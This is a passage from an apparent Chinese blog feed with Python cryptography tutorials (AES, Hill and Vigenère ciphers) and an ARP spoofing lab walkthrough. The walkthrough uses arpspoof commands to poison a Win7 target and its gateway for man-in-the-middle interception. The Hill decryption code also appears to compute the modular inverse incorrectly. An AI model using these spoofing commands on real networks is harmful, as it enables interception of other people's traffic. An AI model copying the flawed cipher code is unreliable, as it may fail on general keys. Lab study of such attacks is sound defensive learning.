class="hljs-comment">#行位移</span><br>Result_2=ReRotHang(Result_2)<br><span class="hljs-comment">#print(Result_2)</span><br><br><span class="hljs-comment">#列混淆</span><br>Result_2=ReColMix(Result_2)<br><span class="hljs-comment">#print(Result_2)</span><br><span class="hljs-comment">#轮密钥加</span><br>w_mix_i=ReColMix(StreamListToMix(Words[i+<span class="hljs-number">1</span>]))<br><span class="hljs-comment">#print(w_mix_i)</span><br>Result_1=RoundKeyAdd(Result_2,w_mix_i)<br><span class="hljs-comment">#print(Result_1)</span><br><span class="hljs-comment">#第10轮</span><br>w_mix_11=StreamListToMix(Words[<span class="hljs-number">10</span>])<br><span class="hljs-comment">#字节代换</span><br>Result_2=ReSubByte(Result_1)<br><span class="hljs-comment">#行位移</span><br>Result_2=ReRotHang(Result_2)<br><span class="hljs-comment">#print(Result_2)</span><br><span class="hljs-comment">#轮密钥加</span><br>Result_1=RoundKeyAdd(Result_2,w_mix_11)<br><br><br><span class="hljs-keyword">return</span> Result_1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MixToHexStream</span>(<span class="hljs-params">mix</span>):  <span class="hljs-comment">#返回128bit的16进制流</span><br>HS=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>HS+=<span class="hljs-built_in">hex</span>(mix[j][i])[<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">return</span> HS<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MixToStr</span>(<span class="hljs-params">mix</span>): <span class="hljs-comment">#返回128bit的字符串</span><br>res_str=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>res_str+=<span class="hljs-built_in">chr</span>(mix[j][i])<br><br><span class="hljs-keyword">return</span> res_str<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">StrToBase64</span>(<span class="hljs-params">str1</span>):<br>b = base64.b64encode(str1.encode(<span class="hljs-string">&#x27;latin&#x27;</span>)).decode(<span class="hljs-string">&#x27;latin&#x27;</span>)<br><span class="hljs-keyword">return</span> b<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Base64ToStr</span>(<span class="hljs-params">b</span>):<br>c = base64.b64decode(b.encode(<span class="hljs-string">&#x27;latin&#x27;</span>)).decode(<span class="hljs-string">&quot;latin&quot;</span>)<br><span class="hljs-keyword">return</span> c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">HexStreamToBinList</span>(<span class="hljs-params">HS</span>):<br>P=[]<br>num_2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> HS:<br>b=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(s,<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)<br>num_2+=b<br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(num_2) % <span class="hljs-number">128</span> != <span class="hljs-number">0</span>:<br>num_2 += <span class="hljs-string">&#x27;0&#x27;</span>                      <span class="hljs-comment">#不够填充0</span><br><span class="hljs-built_in">print</span>(num_2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(num_2)//<span class="hljs-number">32</span>):     <span class="hljs-comment">#按照32bit分组</span><br>P.append(num_2[i*<span class="hljs-number">32</span>:i*<span class="hljs-number">32</span>+<span class="hljs-number">32</span>])<br><span class="hljs-keyword">return</span> P<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">StrToBinList</span>(<span class="hljs-params">string</span>): <span class="hljs-comment">#将ASCII字符转位二进制分组流</span><br>P=[]<br>num_2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> string:<br>num_10=<span class="hljs-built_in">ord</span>(s)<br>num_2=num_2+<span class="hljs-built_in">bin</span>(num_10)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-comment">#zfill方法可以指定字符串位数，前面用0填充</span><br><br><span class="hljs-comment">#print(num_2)</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(num_2) % <span class="hljs-number">128</span> != <span class="hljs-number">0</span>:<br>num_2 += <span class="hljs-string">&#x27;0&#x27;</span>                      <span class="hljs-comment">#不够填充0</span><br><span class="hljs-comment">#print(num_2)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(num_2)//<span class="hljs-number">32</span>):     <span class="hljs-comment">#按照32bit分组</span><br>P.append(num_2[i*<span class="hljs-number">32</span>:i*<span class="hljs-number">32</span>+<span class="hljs-number">32</span>])<br><br><span class="hljs-keyword">return</span> P<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><span class="hljs-comment">#message=HexStreamToBinList(&#x27;00112233445566778899aabbccddeeff&#x27;)</span><br><span class="hljs-comment">#key=HexStreamToBinList(&#x27;2b7e151628aed2a6abf7158809cf4f3c&#x27;)</span><br><span class="hljs-comment">#print(message)</span><br><span class="hljs-comment">#print(key)</span><br>message=[<span class="hljs-string">&#x27;01100011011010000110111101101110&#x27;</span>, <span class="hljs-string">&#x27;01100111011110010110000101101110&#x27;</span>, <span class="hljs-string">&#x27;01101001011100110111100101111001&#x27;</span>, <span class="hljs-string">&#x27;01100100011100110000000000000000&#x27;</span>]<br>key=[<span class="hljs-string">&#x27;11101000111010001100110100110100&#x27;</span>, <span class="hljs-string">&#x27;01101000100010011111100000011111&#x27;</span>, <span class="hljs-string">&#x27;10010000000101010100101100110000&#x27;</span>, <span class="hljs-string">&#x27;10011111111000111000011001001100&#x27;</span>]<br>mix=StreamListToMix(message)<br><span class="hljs-built_in">print</span>(mix)<br><span class="hljs-comment">#key_mix=StreamListToMix(key)</span><br><span class="hljs-comment">#print(mix)</span><br><span class="hljs-comment">#sub_mix=SubByte(mix)</span><br><span class="hljs-comment">#print(sub_mix)</span><br><span class="hljs-comment">#rot_mix=RotHang(sub_mix)</span><br><span class="hljs-comment">#print(rot_mix)</span><br><span class="hljs-comment">#col_mix=ColMix(mix)</span><br><span class="hljs-comment">#print(col_mix)</span><br><span class="hljs-comment">#print(WordExp(key))</span><br>c=encrypt(mix,key)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment">#print(MixToStr(c))</span><br><span class="hljs-comment">#print(MixToHexStream(c))</span><br><span class="hljs-comment">#print(StrToBase64(MixToStr(c)))</span><br>p=decrypt(c,key)<br><span class="hljs-built_in">print</span>(p)<br><br><span class="hljs-comment">#c=mix(c)</span><br><span class="hljs-comment">#p=decrypt(c,key)</span><br><span class="hljs-comment">#print(MixToStr(p))</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">encrypt(message,key)</span><br><span class="hljs-string">[[ 37 116  19 127]</span><br><span class="hljs-string"> [223  19  60 168]</span><br><span class="hljs-string"> [210  41   2 236]</span><br><span class="hljs-string"> [151 238 108 192]]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br><br></code></pre></td></tr></table></figure><p>3.运行结果示意图</p><p>初始矩阵状态-》加密得到的矩阵-》解密后的矩阵</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211190121067.png" alt="image-20221119012143013"></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实施ARP攻击与欺骗</title>
    <link href="/post/%E5%AE%9E%E6%96%BDARP%E6%94%BB%E5%87%BB%E4%B8%8E%E6%AC%BA%E9%AA%97.html"/>
    <url>/post/%E5%AE%9E%E6%96%BDARP%E6%94%BB%E5%87%BB%E4%B8%8E%E6%AC%BA%E9%AA%97.html</url>
    
    <content type="html"><![CDATA[<h1 id="实施ARP攻击与欺骗"><a href="#实施ARP攻击与欺骗" class="headerlink" title="实施ARP攻击与欺骗"></a>实施ARP攻击与欺骗</h1><h2 id="1-ARP欺骗原理"><a href="#1-ARP欺骗原理" class="headerlink" title="1.ARP欺骗原理"></a>1.ARP欺骗原理</h2><p>ARP欺骗通过伪造ARP应答包实施欺骗</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211181644993.jpg" alt="img"></p><h2 id="2-实施ARP欺骗"><a href="#2-实施ARP欺骗" class="headerlink" title="2.实施ARP欺骗"></a>2.实施ARP欺骗</h2><h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>攻击机：Kali</p><p>靶机：win7 x64</p><h4 id="1-开启路由转发"><a href="#1-开启路由转发" class="headerlink" title="(1)开启路由转发"></a>(1)开启路由转发</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211052141780.png" alt="image-20221105214121655"></p><h4 id="2-查看攻击主机的IP地址和ARP缓存表"><a href="#2-查看攻击主机的IP地址和ARP缓存表" class="headerlink" title="(2)查看攻击主机的IP地址和ARP缓存表"></a>(2)查看攻击主机的IP地址和ARP缓存表</h4><p>ip地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ifconfig<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211052141771.png" alt="image-20221105214148588"></p><p>arp缓存表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">arp<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211052142048.png" alt="image-20221105214244967"></p><h4 id="3-查看目标主机的ip地址和ARP缓存表"><a href="#3-查看目标主机的ip地址和ARP缓存表" class="headerlink" title="(3)查看目标主机的ip地址和ARP缓存表"></a>(3)查看目标主机的ip地址和ARP缓存表</h4><p>ip地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211052152727.png" alt="image-20221105215202697"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">arp -a<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211052152236.png" alt="image-20221105215227211"></p><h4 id="4-对目标主机实施arp欺骗"><a href="#4-对目标主机实施arp欺骗" class="headerlink" title="(4)对目标主机实施arp欺骗"></a>(4)对目标主机实施arp欺骗</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">arpspoof</span> -i eth0 -t <span class="hljs-number">192.168.83.139</span> <span class="hljs-number">192.168.83.2</span><br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211052157571.png" alt="image-20221105215757483"></p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211052157352.png" alt="image-20221105215718325"></p><h4 id="5-对网关实施arp欺骗"><a href="#5-对网关实施arp欺骗" class="headerlink" title="(5)对网关实施arp欺骗"></a>(5)对网关实施arp欺骗</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">arpspoof</span> -i eth0 -t <span class="hljs-number">192.168.83.2</span> <span class="hljs-number">192.168.83.139</span> <br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211052200136.png" alt="image-20221105220011060"></p><h4 id="6-也可以一条命令同时对目标主机和网关实施arp欺骗"><a href="#6-也可以一条命令同时对目标主机和网关实施arp欺骗" class="headerlink" title="(6)也可以一条命令同时对目标主机和网关实施arp欺骗"></a>(6)也可以一条命令同时对目标主机和网关实施arp欺骗</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">arpspoof</span> -i eth0 -t <span class="hljs-number">192.168.83.139</span> -r <span class="hljs-number">192.168.83.2</span><br></code></pre></td></tr></table></figure><p>-i 网络接口</p><p>-t 目标主机</p><p>-r 双向欺骗</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学编程之希尔密码加解密</title>
    <link href="/post/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%B8%8C%E5%B0%94%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%86.html"/>
    <url>/post/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%B8%8C%E5%B0%94%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%86.html</url>
    
    <content type="html"><![CDATA[<h1 id="密码学编程之希尔密码加解密"><a href="#密码学编程之希尔密码加解密" class="headerlink" title="密码学编程之希尔密码加解密"></a>密码学编程之希尔密码加解密</h1><h2 id="1-什么是希尔-Hill-密码"><a href="#1-什么是希尔-Hill-密码" class="headerlink" title="1.什么是希尔(Hill)密码"></a>1.什么是希尔(Hill)密码</h2><p>Hill密码的基本思想是通过线性变换将n个连续的明文字母替换为n个密文字母。</p><p>Hill密码的实质就是通过一个变换矩阵把明文变换为密文的一种密码体制</p><h2 id="2-希尔密码加解密代码"><a href="#2-希尔密码加解密代码" class="headerlink" title="2.希尔密码加解密代码"></a>2.希尔密码加解密代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>Letters=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">strToArr</span>(<span class="hljs-params">string</span>):<br><span class="hljs-comment">#字符串转成数组</span><br>numList=[]<br>string=string.upper()<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> string:<br>index=Letters.find(s)<br>numList.append(index)<br><br>Array=np.array(numList)<br><br><span class="hljs-keyword">return</span> Array<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ListToStr</span>(<span class="hljs-params"><span class="hljs-type">List</span></span>):<br><span class="hljs-comment">#列表数子为字符</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-type">List</span>:<br>result=result+Letters[i]<br><br><span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">message,m,key</span>):<br><span class="hljs-comment">#Hill加密</span><br>result=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#储存加密后的字符串</span><br><br>m_arr=strToArr(message)    <span class="hljs-comment">#将明文变成int型一维数组</span><br><span class="hljs-comment">#print(m_arr)</span><br>m_arr=m_arr.reshape(-<span class="hljs-number">1</span>,m)  <span class="hljs-comment">#将数组变成m列的向量</span><br><span class="hljs-comment">#print(m_arr)</span><br>c_arr=(np.matmul(m_arr,key))%<span class="hljs-built_in">len</span>(Letters)    <span class="hljs-comment">#加密</span><br><br><span class="hljs-comment">#print(c_arr)</span><br><br>c_arr=c_arr.reshape(-<span class="hljs-number">1</span>)  <span class="hljs-comment">#将结果变为一维数组 </span><br>c_arr=np.around(c_arr)<br>c_arr=c_arr.astype(<span class="hljs-built_in">int</span><br>)<br>c_list=c_arr.tolist()    <br><span class="hljs-comment">#print(c_list)</span><br>result=ListToStr(c_list)  <span class="hljs-comment">#将列表中的数字转成对应字母</span><br><br><span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">c,m,key</span>):<br>k_1=np.linalg.inv(key) <span class="hljs-comment"># 求key的逆矩阵，但由于其不是整数，故通过行列式的乘法逆元乘上伴随矩阵得到整数逆元</span><br>k_det=np.linalg.det(key) <span class="hljs-comment">#求key矩阵的行列式</span><br>k_det_n=k_det%<span class="hljs-built_in">len</span>(Letters) <span class="hljs-comment">#求行列式模26的乘法逆元 本质上是1/|A|</span><br>k_2=k_1*k_det  <span class="hljs-comment">#矩阵的逆乘行列式=伴随矩阵</span><br>k_2=np.around(k_2) <br>k_2=k_2.astype(np.int64)<span class="hljs-comment">#浮点型转int型</span><br><span class="hljs-comment">#print(k_2.dtype)</span><br>k_3=k_det_n*k_2%<span class="hljs-number">26</span> <span class="hljs-comment">#行列式的乘法逆元乘上伴随矩阵得到整数逆元</span><br><span class="hljs-comment">#_3=k_3.astype(np.int)#浮点型转int型</span><br><span class="hljs-comment">#print(k_3)</span><br><br><span class="hljs-keyword">return</span> encrypt(c,m,k_3) <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>message=<span class="hljs-string">&#x27;JIIY&#x27;</span><br>key=np.array([[<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>],<br>[<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>],<br>[<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>],<br>[<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>]],dtype=<span class="hljs-built_in">int</span>)<br>m=<span class="hljs-number">4</span><br>c=decrypt(message,m,key)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br><br><br><br></code></pre></td></tr></table></figure><h2 id="3-运行结果"><a href="#3-运行结果" class="headerlink" title="3.运行结果"></a>3.运行结果</h2><p>加密：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210171703257.png" alt="image-20221017170331148"></p><p>解密：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210171704919.png" alt="image-20221017170416884"></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学编程之维吉尼亚解密</title>
    <link href="/post/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E8%A7%A3%E5%AF%86.html"/>
    <url>/post/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E8%A7%A3%E5%AF%86.html</url>
    
    <content type="html"><![CDATA[<h1 id="密码学编程之维吉尼亚解密"><a href="#密码学编程之维吉尼亚解密" class="headerlink" title="密码学编程之维吉尼亚解密"></a>密码学编程之维吉尼亚解密</h1><h2 id="1-什么是维吉尼亚密码"><a href="#1-什么是维吉尼亚密码" class="headerlink" title="1.什么是维吉尼亚密码"></a>1.什么是维吉尼亚密码</h2><p>它是典型的多表代换密码，它的加密过程可以通过查表来表示，密文字母为横列，密钥字母为纵列（可以互换），对应得到的字母为加密后的密文，相当于每个字母都选择了一个偏移值来进行凯撒加密，但为了增强密码的可用性与简洁性，维吉尼亚的密钥采取周期式的密钥，即每隔一个周期用同一张表（即同一偏移）来加密。</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210021509869.png" alt="img"></p><p>示例：</p><p>密钥为：encryption</p><p>明文为：publickeydistribution</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210021519981.png" alt="在这里插入图片描述"></p><h2 id="2-维吉尼亚解密"><a href="#2-维吉尼亚解密" class="headerlink" title="2.维吉尼亚解密"></a>2.维吉尼亚解密</h2><h3 id="2-1已知密钥的维吉尼亚解密"><a href="#2-1已知密钥的维吉尼亚解密" class="headerlink" title="2.1已知密钥的维吉尼亚解密"></a>2.1已知密钥的维吉尼亚解密</h3><p>思路：做加密的逆过程即可。加密是按照密钥进行凯撒加密，解密就是按照密钥进行凯撒解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> wordninja <span class="hljs-comment">#wordninja是分词工具</span><br><br>Letters=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">key,message</span>):<br><br>result=<span class="hljs-string">&#x27;&#x27;</span><br>l=<span class="hljs-built_in">len</span>(key)<br>j=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br>index=(Letters.find(i)-Letters.find(key[j]))%<span class="hljs-number">26</span><br>j=(j+<span class="hljs-number">1</span>)%l<br>result=result+Letters[index]<br><br>text=<span class="hljs-string">&#x27; &#x27;</span>.join(wordninja.split(result)) <span class="hljs-comment">#对解密结果按英文分词，增加可读性</span><br><br><span class="hljs-keyword">return</span> text<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>message=<span class="hljs-string">&#x27;krkpewxvftksopztecxvbuhfvycgxouflihoffptrcwffwhkcevxhiuzfposdvccyctpmjtbfymllctiwxtacsmjmoncwdnawjrwtjgjsuystvbxgvcmgczbqecllttfkjlacpfttjgeegtbvkfpmhjzqaxhvvpgxoeychrcwumchhyigixhqdciawunmjerefkekcozqttznfdjlopuyqhjgrjawcpfrgxhwiljgrgiycrqkiajfgvrlrxgkkghdbqnliaovzrltgafslacjvjexrwjrdzsvruprttfkwxfgrlstznnmjerdvjdlhkwwdngjfsawgjfunhitjcaykgrptzicibtwrcpycwbkxfibrqemivotvwdnotvldmvgicshbqkztmfqlzaxrqekntqefscmbqkfxguyzjaaorgccmcovrwxbckgdgonrqhxadcclbznjfdpzgegtgqawygxkgcjiasofqiecxvbdyageztjikvrxymqlapghcbcrtfgfdnhitjcaytqiknlsnwgrtbpfrlkwvvycraqicqnhpfrwbbizliasyfpawqqljslhqgktmccumgxmqlsemcvycsxovy&#x27;</span><br>key=<span class="hljs-string">&#x27;CRYPTO&#x27;</span><br><span class="hljs-built_in">print</span>(decrypt(key,message.upper()))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h3 id="2-2唯密文的维吉尼亚解密"><a href="#2-2唯密文的维吉尼亚解密" class="headerlink" title="2.2唯密文的维吉尼亚解密"></a>2.2唯密文的维吉尼亚解密</h3><h4 id="1-利用重合指数-重合互指数解密"><a href="#1-利用重合指数-重合互指数解密" class="headerlink" title="1.利用重合指数+重合互指数解密"></a>1.利用重合指数+重合互指数解密</h4><p>此种方法对于唯密文的维吉尼亚解密是基于语言的统计规律，所以当密文很短是是无法用该方法解密的，对长密文比较适用</p><p>思路：</p><p>1.根据kasiski或者重合指数计算出密钥长度</p><p>Kasiski测验法基本原理：用给定长度为k的密钥周期性地对明文加密，则但明文中有两个相同的字母，且对应被加密后的字母也相同时，这两个字母的间距是k的倍数。找到密文中相同字母间隔的最大公因数，很有可能是密钥长度。</p><p>重合指数法：对单表替换而已，并不会改变字符串的统计特性（比如，某个英语字母出现的频率），故其重合指数应该约等于0.065。可以爆破密钥长度，根据密钥长度将同一密钥字母加密的字母放在一个分组内，每个分组都相当于被单表替换，都应满足重合指数应该约等于0.065。</p><p>重合指数:两个随机字母相同的概率（即在一字符串中随机取出两个字母为a的概率+同为b的概率+…）</p><script type="math/tex; mode=display">IC=\sum_{i=1}^{n}p_i^2</script><p>（pi为字母i出现频率）</p><p>重合指数无偏估计值(更准确，用此来计算):</p><script type="math/tex; mode=display">IC^{'}=\sum_{i=1}^{n}\frac{f_i(f_i-1)}{n(n-1)}</script><p>（fi为字母i出现次数，n为字符串字符总数）</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getCnt</span>(<span class="hljs-params">string</span>):<br><span class="hljs-comment">#统计字符出现的次数</span><br>LettersZd=&#123;<span class="hljs-string">&#x27;A&#x27;</span>:<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;B&#x27;</span>:<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-number">0</span>, <span 